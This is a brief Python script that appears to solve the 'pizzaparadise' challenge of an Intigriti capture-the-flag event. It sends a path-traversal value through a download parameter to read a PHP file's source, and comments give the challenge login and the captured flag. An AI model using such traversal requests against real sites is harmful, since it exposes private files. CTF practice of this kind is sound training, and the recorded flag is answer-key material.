import requests

# login with agent_1337, intel420

path = "/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"
url = f"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download={path}"
resp = requests.get(url)
print(resp.text)

# $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
